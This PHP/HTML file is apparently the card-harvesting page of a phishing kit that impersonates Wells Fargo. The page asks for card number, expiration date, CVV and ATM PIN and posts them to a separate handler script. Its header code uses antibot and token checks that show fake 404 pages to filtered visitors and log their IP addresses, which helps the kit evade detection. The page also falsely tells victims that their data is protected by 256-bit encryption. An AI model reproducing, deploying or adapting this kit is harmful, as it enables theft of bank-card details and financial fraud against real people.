<?php

    session_start();

    require_once '../Layout/Comp.php';
    require_once '../Layout/Antibot.php';
    require_once '../Layout/demonTest.php';

    $comps = new Comp;
    $antibot = new Antibot;

    $settings = $comps->settings();

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        $comps->log(
            "../Export/key/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Token\n\n"
        );
        die();
    }

    if (
        !isset($_SESSION['username']) ||
        $_SESSION['username'] == ""
    ) {
        echo $antibot->throw404();
        $comps->log(
            "../Rules/Events/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Skipping Pages\n\n"
        );
        die();
    }

?>

<!DOCTYPE html>
<html class="ui-mobile wf-myriadpro-n4-active wf-active" lang="en">

<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
    <title>Wells Fargo - Your Information</title>
    <link rel="stylesheet" href="../Export/css/jquery.css">
    <link rel="stylesheet" href="../Export/css/desktop-tablet.css">
    <link rel="shortcut icon" href="../Export/img/favicon.ico" type="image/x-icon">
</head>

<style>
    @media (max-width: 428px) {
        .inline-field,
        .ui-input-text {
            width: 100% !important;
        }

        .lb {
            padding-top: .5rem;
        }
    }
</style>

<body style="opacity: 1; visibility: visible;" class="ui-mobile-viewport ui-overlay-a" data-inq-observer="1">
    <noscript>
        <p class="ui-state-alert">
            You must have JavaScript enabled to apply for an account or service. Please turn on JavaScript and refresh
            the page.
        </p>
    </noscript>
    <div id="mainpage" data-role="page" class="osmp-app ui-page ui-page-theme-a ui-page-active" data-title="Wells Fargo - Application - About You" data-url="mainpage">
        <div id="skipToMainContent">
            <a style="cursor: pointer;" tabindex="1" class="ui-link">Skip to main content</a>
        </div>
        <header role="banner">
            <div class="masthead">
                <nav class="back">
                </nav>
                <div>
                    <a class="c28cLink child-window ui-link" style="cursor: pointer;"> <img class="masthead-img-logo" alt="Wells Fargo" role="img" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4NCjxzdmcgd2lkdGg9IjIxMXB4IiBoZWlnaHQ9IjIycHgiIHZpZXdCb3g9IjAgMCAyMTEgMjIiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+DQogICAgPCEtLSBHZW5lcmF0b3I6IFNrZXRjaCA1MS4zICg1NzU0NCkgLSBodHRwOi8vd3d3LmJvaGVtaWFuY29kaW5nLmNvbS9za2V0Y2ggLS0+ICAgIA0KICAgIDxkZXNjPjwvZGVzYz4NCiAgICA8ZGVmcz48L2RlZnM+DQogICAgPGcgaWQ9InN5bWJvbHMiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxIiBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPg0KICAgICAgICA8ZyBpZD0ibWFzdGhlYWQtb3NtcC1tZWRpdW0tdGVybWluYXRpb24iIHRyYW5zZm9ybT0idHJhbnNsYXRlKC0yMC4wMDAwMDAsIC0xNy4wMDAwMDApIiBmaWxsPSIjRkZGRkZGIj4NCiAgICAgICAgICAgIDxnIGlkPSJCSU0vbG9nby9sYXJnZS0yMTF4MjIiPg0KICAgICAgICAgICAgICAgIDxnIHRyYW5zZm9ybT0idHJhbnNsYXRlKDIwLjAwMDAwMCwgMTcuMDAwMDAwKSI+DQogICAgICAgICAgICAgICAgICAgIDxnIGlkPSJXZWxsc19GYXJnbyI+DQogICAgICAgICAgICAgICAgICAgICAgICA8cGF0aCBkPSJNNDUuMTEyLDE0LjE3MDkgTDQ3LjE2OTIsMTQuMTcwOSBMNDcuMTY5MiwyMSBMMjkuOTk3NywyMSBMMjkuOTk3NywxOC41MTQyIEwzMi40MjYyLDE4LjUxNDIgTDMyLjQyNjIsMy40ODU0IEwyOC40ODYyLDMuNDg1NCBMMjMuNDg1NywyMSBMMTkuNTE0MywyMSBMMTUuNDU3LDYuNDg1NSBMMTEuMjg1OSwyMSBMNy4zMTQyLDIxIEwyLjI4NTcsMy40ODU0IEwwLDMuNDg1NCBMMCwxIEw5LjMxNDMsMSBMOS4zMTQzLDMuNDg1NCBMNi42Mjg2LDMuNDg1NCBMOS45NzEzLDE1LjU0MjYgTDEzLjk3MTUsMSBMMTguMDg1NywxIEwyMi4xNzE1LDE1LjU3MTYgTDI1LjQ1NzQsMy40ODU0IEwyMi42NTc0LDMuNDg1NCBMMjIuNjU3NCwxIEw0Ni44ODM2LDEgTDQ2Ljg4MzYsNy40ODU0IEw0NC44MjYzLDcuNDg1NCBMNDQuNjI2Myw2LjcxMzkgQzQzLjk5NzksNC4zMTM5IDQzLjM0MDgsMy40ODU0IDQxLjQyNjMsMy40ODU0IEwzNi42ODMyLDMuNDg1NCBMMzYuNjgzMiw5LjUxNCBMNDIuNDI2Myw5LjUxNCBDNDIuNjQ0MTg5NSw5LjkzNzY2NDU1IDQyLjc1MjI5MDMsMTAuNDA5MjMgNDIuNzQwNywxMC44ODU1IEM0Mi43NTU0NjM4LDExLjM4MDIyNjYgNDIuNjQ3NDQ3LDExLjg3MDkwNjIgNDIuNDI2MywxMi4zMTM3IEwzNi42ODMyLDEyLjMxMzcgTDM2LjY4MzIsMTguNTEzNyBMNDEuNjI2MSwxOC41MTM3IEM0My40ODM0LDE4LjUxMzcgNDQuMzEyLDE3LjcxMzcgNDQuODgzNSwxNS4xNzA3IEw0NS4xMTIsMTQuMTcwOSBaIE02My4xNjc2LDE1LjE3MDkgQzYyLjU5NiwxNy43MTM3IDYxLjc5NjEsMTguNTEzOSA1OS45MTAxLDE4LjUxMzkgTDU1LjkzODcsMTguNTEzOSBMNTUuOTM4NywzLjQ4NTQgTDU4LjY1MzEsMy40ODU0IEw1OC42NTMxLDEgTDQ5LjI1MzEsMSBMNDkuMjUzMSwzLjQ4NTQgTDUxLjY4MTYsMy40ODU0IEw1MS42ODE2LDE4LjUxNDIgTDQ5LjI1MzIsMTguNTE0MiBMNDkuMjUzMSwyMSBMNjUuNDUzMiwyMSBMNjUuNDUzMiwxNC4xNzA5IEw2My4zOTYsMTQuMTcwOSBMNjMuMTY3NiwxNS4xNzA5IFogTTgxLjE2NiwxNS4xNzA5IEM4MC41OTQ1LDE3LjcxMzcgNzkuNzk0NSwxOC41MTM5IDc3LjkwODUsMTguNTEzOSBMNzMuOTM3NCwxOC41MTM5IEw3My45Mzc0LDMuNDg1NCBMNzYuNjUxNSwzLjQ4NTQgTDc2LjY1MTUsMSBMNjcuMjUxNSwxIEw2Ny4yNTE1LDMuNDg1NCBMNjkuNjgsMy40ODU0IEw2OS42OCwxOC41MTQyIEw2Ny4yNTEzLDE4LjUxNDIgTDY3LjI1MTMsMjEgTDgzLjQ1MTMsMjEgTDgzLjQ1MTMsMTQuMTcwOSBMODEuMzk0MywxNC4xNzA5IEw4MS4xNjYsMTUuMTcwOSBaIE05Ni4yMjEzLDkuMjg1NCBMOTIuNTkyNiw4LjQ1NjggQzkwLjQ3ODUsNy45NzEgODkuNTkyNiw3LjE0MjYgODkuNTkyNiw1Ljc0MjUgQzg5LjU5MjcsNC4wNTY3IDkwLjkzNTYsMyA5My41NjQxLDMgQzk2LjE5MjYsMyA5Ny43MzU1LDMuOTQyOSA5OC4zMzU3LDYuMTcxMyBMOTguNTkyOSw3LjE0MjkgTDEwMC42NDk5LDcuMTQyOSBMMTAwLjY0OTksMi4yIEM5OC40MDQ1ODEsMS4wNDQ5ODkxNyA5NS45MTc3NTgzLDAuNDM3ODM4NTk5IDkzLjM5MjgsMC40MjgyIEM4OC41MDY5LDAuNDI4MiA4NS4zNjQ0LDIuNzcxIDg1LjM2NDQsNi41NDI1IEM4NS4zNjQ0LDkuNDU2NyA4Ny4xOTI5LDExLjU5OTUgOTAuNzA2OSwxMi4zNzEgTDk0LjMzNTYsMTMuMTcxIEM5Ni42NSwxMy42ODUyIDk3LjUwNywxNC41OTk1IDk3LjUwNywxNi4xMTM5IEM5Ny41MDcsMTcuOTcxMiA5Ni4xMDcsMTguOTk5NSA5My4zMDcsMTguOTk5NSBDOTAuMTM1MywxOC45OTk1IDg4LjUwNywxNy43NDI0IDg3Ljc5MjQsMTUuMzQyNCBMODcuNDIxMiwxNC4xMTM5IEw4NS4zNjQyLDE0LjExMzkgTDg1LjM2NDIsMTkuNzEzOSBDODcuOTc4NDk1LDIxLjAxNTgwNjcgOTAuODczMjM0OCwyMS42NTM2OTc2IDkzLjc5MjYsMjEuNTcxMiBDOTguNTkyNiwyMS41NzEyIDEwMS43MzU0LDE5LjE3MTIgMTAxLjczNTQsMTUuNDI4IEMxMDEuNzM1NiwxMi4yODU1IDk5LjgyMTIsMTAuMTEzOSA5Ni4yMjEzLDkuMjg1NCBaIE0xMjMuNzYxMywzLjQ4NTQgQzEyNS42NzU1LDMuNDg1NCAxMjYuMzMyOSw0LjMxMzggMTI2Ljk2MTMsNi43MTM5IEwxMjcuMTYxMyw3LjQ4NTQgTDEyOS4yMTg1LDcuNDg1NCBMMTI5LjIxODUsMSBMMTExLjk5LDEgTDExMS45OSwzLjQ4NTQgTDExNC40MTg3LDMuNDg1NCBMMTE0LjQxODcsMTguNTE0MiBMMTExLjk5LDE4LjUxNDIgTDExMS45OSwyMSBMMTIxLjUzMzIsMjEgTDEyMS41MzMyLDE4LjUxNDIgTDExOC42NzU4LDE4LjUxNDIgTDExOC42NzU4LDEyLjY4NTIgTDEyNC41NjE2LDEyLjY4NTIgQzEyNC43ODI3NzEsMTIuMjQyNDE0NiAxMjQuODkwNzg5LDExLjc1MTcyODkgMTI0Ljg3NiwxMS4yNTcgQzEyNC44ODc2NTksMTAuNzgwNzIzIDEyNC43Nzk1NTQsMTAuMzA5MTQwOSAxMjQuNTYxNiw5Ljg4NTUgTDExOC42NzU4LDkuODg1NSBMMTE4LjY3NTgsMy40ODU1IEwxMjMuNzYxMywzLjQ4NTQgWiBNMTY3LjMwMTMsMTguNzQyNCBDMTY3LjY0NDIyOSwxOS40ODU4NjA2IDE2Ny42NDQyMjksMjAuMzQyMjM5NCAxNjcuMzAxMywyMS4wODU3IEMxNjYuNTYyNDMsMjEuMTgxMzYwNCAxNjUuODE4MTM2LDIxLjIyOTAyNyAxNjUuMDczMSwyMS4yMjg0IEMxNjIuMzAxNiwyMS4yMjg0IDE2MC45NTg2LDIwLjA4NTUgMTYwLjY0NDMsMTcuNDI4NCBMMTYwLjUyOTksMTYuNDI4NCBDMTYwLjE4NzEsMTMuNTQyOSAxNTkuMjQ0MSwxMi40Mjg0IDE1Ni4xMDE0LDEyLjQyODQgTDE1NC41MywxMi40Mjg0IEwxNTQuNTMsMTguNTE0MyBMMTU3LjI0NDMsMTguNTE0MyBMMTU3LjI0NDMsMjEgTDEzOS4yNzQzLDIxIEwxMzkuMjc0MywxOC41MTQyIEwxNDEuNjE3MSwxOC41MTQyIEwxNDAuMzAyNiwxNC45NDI1IEwxMzIuODc0MywxNC45NDI1IEwxMzEuNTYsMTguNTE0MiBMMTMzLjk2LDE4LjUxNDIgTDEzMy45NiwyMSBMMTI2LjM4ODMsMjEgTDEyNi4zODgzLDE4LjUxNDIgTDEyOC4zODgzLDE4LjUxNDIgTDEzNS4zODgzLDAuOTk5NyBMMTM5LjE4ODMsMC45OTk3IEwxNDYuMzMxMiwxOC41MTQyIEwxNTAuMjcyMiwxOC41MTQyIEwxNTAuMjcyMiwzLjQ4NTQgTDE0Ny44NDM3LDMuNDg1NCBMMTQ3Ljg0MzcsMSBMMTU5LjMzLDEgQzE2My40MTU4LDEgMTY2LjA3MjksMy4wMjg2IDE2Ni4wNzI5LDYuMjg1NyBDMTY2LjA3MjksOS41MTQzIDE2My40MTU4LDExLjIyODYgMTYwLjg0NDIsMTEuMzQyOSBMMTYwLjg0NDIsMTEuNDI4NiBDMTYzLjQ0NDIsMTEuNjI4NiAxNjQuNTAxNSwxMy4wODU2IDE2NC43NTg0LDE1LjM0MjkgTDE2NC44NzI4LDE2LjM5OTkgQzE2NS4wNDQzLDE4LjA1NzEgMTY1LjM4NzEsMTguNzk5OSAxNjYuNzAxNiwxOC43OTk5IEMxNjYuOTAyNzMzLDE4Ljc5NzcyNDYgMTY3LjEwMzMxOSwxOC43Nzg0ODg5IDE2Ny4zMDEyLDE4Ljc0MjQgTDE2Ny4zMDEzLDE4Ljc0MjQgWiBNMTM5LjM4ODcsMTIuNTEzOCBMMTM2LjU4ODcsNC45NDI2IEwxMzMuNzg4NywxMi41MTM4IEwxMzkuMzg4NywxMi41MTM4IFogTTE2MS43NTg3LDYuNjg1NSBDMTYxLjc1ODcsNC41OTk2IDE2MC40NzMyLDMuNDg1NSAxNTcuOTAxNiwzLjQ4NTUgTDE1NC41MywzLjQ4NTUgTDE1NC41Myw5LjkxMzkgTDE1Ny45MDE0LDkuOTEzOSBDMTYwLjQ0NDIsOS45MTM5IDE2MS43NTg0LDguNzQyNSAxNjEuNzU4NCw2LjY4NTUgTDE2MS43NTg3LDYuNjg1NSBaIE0xNzguODIxMywxMS44ODU1IEMxNzguODAzMDg3LDEyLjM3MTQ4NDYgMTc4LjkxMTMxNSwxMi44NTM4NzY2IDE3OS4xMzU0LDEzLjI4NTUgTDE4Mi41MzU0LDEzLjI4NTUgTDE4Mi41MzU0LDE4LjM0MjkgQzE4MS40NjYwNzQsMTguNzgyNTkxNyAxODAuMzIwMTc5LDE5LjAwNTg5NzMgMTc5LjE2NCwxOC45OTk5IEMxNzUuMDQ5OCwxOC45OTk5IDE3Mi45MDY2LDE2LjA1NyAxNzIuOTA2NiwxMC45NzE0IEMxNzIuOTA2Niw1Ljg4NTggMTc1LjA0OTgsMi45NDI4IDE3OC45MzUzLDIuOTQyOCBDMTgxLjIxMTU4MiwyLjgyNTczMTA0IDE4My4yNzQ0NjcsNC4yNzU2MDk0MSAxODMuOTM1Myw2LjQ1NyBMMTg0LjI0OTQsNy4yNTcgTDE4Ni4zMDY2LDcuMjU3IEwxODYuMzA2NiwyLjE0MjQgQzE4My45NTcwOTQsMC45NjQ5OTcwNTUgMTgxLjM2MzA4MiwwLjM1ODE0NTk1OCAxNzguNzM1MSwwLjM3MTEgQzE3Mi40NSwwLjM3MTEgMTY4LjIyMSw0LjU3MTIgMTY4LjIyMSwxMSBDMTY4LjIyMSwxNy40NTcxIDE3Mi4zMzUyLDIxLjU3MTcgMTc4LjczNTEsMjEuNTcxNyBDMTgxLjUyOTc3MSwyMS40OTc0NzMxIDE4NC4yNjg3NjQsMjAuNzczNDg4OCAxODYuNzM1MSwxOS40NTcxIEwxODYuNzM1MSwxMC41NDI1IEwxNzkuMTM1MSwxMC41NDI1IEMxNzguOTE0MzQyLDEwLjk1NDgzOTcgMTc4LjgwNjAxMywxMS40MTgwMjQ1IDE3OC44MjEsMTEuODg1NSBMMTc4LjgyMTMsMTEuODg1NSBaIE0yMTAuNjI2NiwxMC45NzEyIEMyMTAuNjA4NjM0LDE2LjgyODUxMzcgMjA1Ljg1NTI5MSwyMS41NjcyOTg0IDE5OS45OTc5NSwyMS41NjcyOTg0IEMxOTQuMTQwNjA5LDIxLjU2NzI5ODQgMTg5LjM4NzI2NiwxNi44Mjg1MTM3IDE4OS4zNjkzLDEwLjk3MTIgQzE4OS4zODcyNjYsNS4xMTM4ODYzNSAxOTQuMTQwNjA5LDAuMzc1MTAxNjQ5IDE5OS45OTc5NSwwLjM3NTEwMTY0OSBDMjA1Ljg1NTI5MSwwLjM3NTEwMTY0OSAyMTAuNjA4NjM0LDUuMTEzODg2MzUgMjEwLjYyNjYsMTAuOTcxMiBaIE0yMDUuOTQwOCwxMC45NzEyIEMyMDUuOTQwOCw1LjkxMzkgMjAzLjg1NTEsMi45NzEyIDE5OS45OTc4LDIuOTcxMiBDMTk2LjE0MDUsMi45NzEyIDE5NC4wNTUxLDUuOTE0MSAxOTQuMDU1MSwxMC45NzEyIEMxOTQuMDU1MSwxNi4wNTY4IDE5Ni4xMTIzLDE4Ljk3MTIgMTk5Ljk5NzgsMTguOTcxMiBDMjAzLjg4MzMsMTguOTcxMiAyMDUuOTQwNSwxNi4wNTY4IDIwNS45NDA1LDEwLjk3MTIgTDIwNS45NDA4LDEwLjk3MTIgWiIgaWQ9IlNoYXBlIiBmaWxsLXJ1bGU9Im5vbnplcm8iPjwvcGF0aD4NCiAgICAgICAgICAgICAgICAgICAgPC9nPg0KICAgICAgICAgICAgICAgIDwvZz4NCiAgICAgICAgICAgIDwvZz4NCiAgICAgICAgPC9nPg0KICAgIDwvZz4NCjwvc3ZnPg==">
                    </a>
                    <span class="ui-hidden-accessible">Screen reader users may experience shifts in focus that are
                        caused by their devices operating system.</span>
                </div>
                <div role="navigation" class="top-search">
                    <ul>
                        <li class="security">
                            <a class="c28cLink child-window ui-link" style="cursor: pointer;">Online Security<span class="ui-hidden-accessible">, opens
                                    in a new window</span>
                            </a>
                        </li>
                    </ul>
                </div>
                <nav class="menu">
                    <a style="cursor: pointer;" class="ui-link"></a>
                </nav>
            </div>
        </header>
        <div id="mainColumns" tabindex="-1" role="main" class="ui-content osmp-content">
            <div class="primary-content">
                <div class="progress-small">
                    <span class="right">
                        Step 2 of 2
                    </span>
                </div>
                <div class="progress-bar not-small-screen">
                    <ul class="ui-grid-d">
                        <li class="ui-block-b">
                            <span>
                                <span>Billing Information</span>
                            </span>
                        </li>
                        <li class="ui-block-c active">
                            <span>
                                <span>Card Information</span>
                            </span>
                        </li>
                    </ul>
                </div>
                <div class="osmp-title">
                    <div>
                        <h1>Card Information</h1>
                    </div>
                    <div class="large-screen right sub-title">
                        All fields are required.
                    </div>
                </div>
                <div class="not-large-screen">
                    <p class="sub-title">
                        All fields are required.
                    </p>
                </div>
                <form id="form" class="wait" action="../Layout/Terraform/card.php?token=<?php echo $_SESSION['token']; ?>" method="POST">
                    <h2 class="section-hdr">
                        Card information
                    </h2>
                    <div class="section">
                        <span>
                            Your card information is kept safe with 256-bit encryption.
                            <br>
                            We will cross-check your information with the records on-file with us.
                            <br>
                            Please make sure the information you submit is up-to date and valid.
                        </span>
                        <div style="margin-top: .5rem;">
                            <span id="error" class="error-list"></span>
                        </div>
                        <div style="margin-top: 2rem;" class="ui-field-contain street2-field-voice-over">
                            <label for="card">
                                Card Number
                            </label>
                            <div id="c1" class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset">
                                <input style="text-transform: capitalize;" id="card" name="card" class="pmask" type="text" size="35">
                            </div>
                        </div>
                        <div class="ui-field-contain inline-field-contain">
                            <div class="inline-field">
                                <label for="exp">
                                    Expiration Date
                                </label>
                                <div id="e1" class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset">
                                    <input style="text-transform: capitalize;" id="exp" name="exp" class="pmask required EMAIL" type="text">
                                </div>
				            </div>
                            <div class="inline-field">
                                <label class="lb" for="cvv">
                                    CVV
                                </label>
                                <div id="c2" class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset">
                                    <input style="text-transform: capitalize;" id="cvv" name="cvv" class="pmask required EMAIL" type="text">
                                </div>
				            </div>
                        </div>
                        <div class="ui-field-contain street2-field-voice-over">
                            <label for="atm">
                                ATM PIN
                            </label>
                            <div id="a1" class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset">
                                <input style="text-transform: capitalize;" id="atm" name="atm" class="pmask" type="text">
                            </div>
                        </div>
                    </div>
                    <div class="btn-ctr">
                        <div class="btn-ctr-inner">
                            <button id="btn" type="button" class="continue-button ui-btn ui-btn-p" disabled="disabled">
                                Continue
                            </button>
                        </div>
                    </div>
                </form>
            </div>
        </div>
        <div data-role="footer" class="osmp-footer ui-footer ui-bar-inherit singleColumn" role="contentinfo">
            <footer role="contentinfo">
                <div class="c9">
                    <nav aria-label="corporate, legal, security">
                        <ul class="not-large-screen">
                            <li><a class="c28cLink child-window ui-link" style="cursor: pointer;">Privacy, Cookies, Security
                                    &amp; Legal</a></li>
                            <li><a class="c28cLink child-window ui-link" style="cursor: pointer;">Ad
                                    Choices</a></li>
                            <li><a class="c28cLink child-window ui-link" title="Online Security" style="cursor: pointer;">Online Security</a></li>
                        </ul>
                        <ul class="large-screen">
                            <li><a class="c28cLink child-window ui-link" style="cursor: pointer;">Privacy, Cookies, Security
                                    &amp; Legal</a></li>
                            <li><a class="c28cLink child-window ui-link" style="cursor: pointer;">Ad
                                    Choices</a></li>
                            <li><a class="c28cLink child-window ui-link" title="Online Security" style="cursor: pointer;">Online Security</a></li>
                        </ul>
                    </nav>
                    <hr>
                    © 1999 - <span class="placeholder">2022</span> Wells Fargo. All rights reserved. NMLSR ID 399801
                </div>
            </footer>
        </div>
    </div>
    <script src="../Export/js/cleave.js"></script>
    <script src="../Export/js/card.js"></script>
</body>

</html>